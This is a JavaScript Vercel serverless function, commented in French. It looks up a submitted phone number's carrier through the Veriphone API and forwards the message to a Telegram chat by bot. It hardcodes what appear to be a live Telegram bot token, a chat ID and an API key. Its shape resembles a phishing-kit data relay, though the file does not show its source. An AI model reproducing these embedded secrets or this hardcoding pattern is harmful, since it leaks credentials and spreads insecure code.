// Fonction serverless Vercel pour envoyer à Telegram
const TELEGRAM_BOT_TOKEN = '8864088656:AAG1aGMsbwWtY0fWMTSmhdZJs_WY5o9FwKY';
const TELEGRAM_CHAT_ID = '-1004297758085';
const VERIPHONE_API_KEY = '1563422FD1574FD88816AE5E4F512843';

function normalizePhoneForVeriphone(phone) {
  if (!phone) {
    return '';
  }

  let normalized = phone.replace(/\D/g, '');

  if (normalized.length === 10 && normalized.startsWith('0')) {
    normalized = '+33' + normalized.slice(1);
  } else if (normalized.length === 11 && normalized.startsWith('33')) {
    normalized = '+' + normalized;
  } else if (normalized.startsWith('00')) {
    normalized = '+' + normalized.slice(2);
  } else if (!normalized.startsWith('+')) {
    normalized = '+' + normalized;
  }

  return normalized;
}

async function fetchOperator(phone) {
  const normalizedPhone = normalizePhoneForVeriphone(phone);
  if (!normalizedPhone) {
    return null;
  }

  try {
    const response = await fetch(`https://api.veriphone.io/v2/verify?phone=${encodeURIComponent(normalizedPhone)}&key=${VERIPHONE_API_KEY}`);
    if (!response.ok) {
      return null;
    }

    const result = await response.json();
    if (!result || typeof result !== 'object') {
      return null;
    }

    return result.operator || result.carrier || result.carrier_name || result.network || null;
  } catch (error) {
    return null;
  }
}

export default async function handler(req, res) {
  // Vérifier que c'est une requête POST
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { message, phone } = req.body;

  if (!message) {
    return res.status(400).json({ error: 'Message is required' });
  }

  let finalMessage = message;
  if (phone) {
    const operator = await fetchOperator(phone);
    if (operator) {
      finalMessage += `\n\nOperateur : ${operator}`;
    } else {
      finalMessage += `\n\nOperateur : Inconnu`;
    }
  }

  try {
    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: finalMessage,
        parse_mode: 'HTML'
      })
    });

    const data = await response.json();

    if (data.ok) {
      res.status(200).json({ success: true });
    } else {
      res.status(500).json({ error: data.description });
    }
  } catch (error) {
    res.status(500).json({ error: 'Failed to send message' });
  }
}
